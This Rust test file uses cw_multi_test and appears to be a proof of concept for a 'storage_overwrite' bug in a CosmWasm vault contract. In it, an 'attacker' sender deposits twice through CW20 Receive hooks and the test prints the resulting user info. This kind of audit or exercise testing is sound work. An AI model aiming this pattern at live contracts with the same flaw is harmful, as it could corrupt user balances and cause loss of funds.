use cosmwasm_std::{Addr, Coin, coin, Querier, Uint128};
use cosmwasm_std::{QueryRequest, BankQuery, to_binary, from_binary, BalanceResponse};
use cw20::Cw20ReceiveMsg;
use cw_vault::assets::AssetInfo;
use cw_vault::contract::{instantiate, execute, query};
use cw_vault::msg::{InstantiateMsg, Cw20HookMsg, ExecuteMsg, UserResponse, QueryMsg};
use cw_multi_test::{App, ContractWrapper, Executor};

fn mint_native(app: &mut App, beneficiary: String, denom: String, amount: u128) {
    app.sudo(cw_multi_test::SudoMsg::Bank(
        cw_multi_test::BankSudo::Mint {
            to_address: beneficiary,
            amount: vec![coin(amount, denom)],
        },
    ))
    .unwrap();
}

fn query_balance_native(app: &App, address: &Addr, denom: &str) -> Coin {
    let req: QueryRequest<BankQuery> = QueryRequest::Bank(BankQuery::Balance { address: address.to_string(), denom: denom.to_string() });
    let res = app.raw_query(&to_binary(&req).unwrap()).unwrap().unwrap();
    let balance: BalanceResponse = from_binary(&res).unwrap();

    return balance.amount;        
}

#[test]
    fn storage_overwrite_test() {
        let mut app = App::default();
        let code = ContractWrapper::new(execute, instantiate, query);
        let code_id = app.store_code(Box::new(code));
        let contract_addr = app
            .instantiate_contract(
                code_id,
                Addr::unchecked("owner"),
                &InstantiateMsg { owner: Addr::unchecked("owner").to_string(), asset_infos: vec![AssetInfo::Token{contract_addr:Addr::unchecked("token_1")},AssetInfo::Token{contract_addr:Addr::unchecked("token_2")}] },
                &[],
                "Contract",
                None,
            )
            .unwrap();
        let encoded = cosmwasm_std::to_binary(&Cw20HookMsg::Deposit {});
        let mock_send_tokens = app.execute_contract(Addr::unchecked("token_1"), contract_addr.clone(), &ExecuteMsg::Receive(Cw20ReceiveMsg {
            sender: "attacker".to_string(),
            amount: Uint128::new(2137),
            msg: encoded.unwrap(),
        }), &[]);
        println!("{:?}", mock_send_tokens);

        let encoded = cosmwasm_std::to_binary(&Cw20HookMsg::Deposit {});
        let mock_send_tokens = app.execute_contract(Addr::unchecked("token_1"), contract_addr.clone(), &ExecuteMsg::Receive(Cw20ReceiveMsg {
            sender: "attacker".to_string(),
            amount: Uint128::new(7),
            msg: encoded.unwrap(),
        }), &[]);
        println!("{:?}", mock_send_tokens);


        let query_user_info: UserResponse = app.wrap().query_wasm_smart(contract_addr, &QueryMsg::UserInfo{ user: "attacker".to_string() }).unwrap();
        println!("{:?}", query_user_info);
         }
        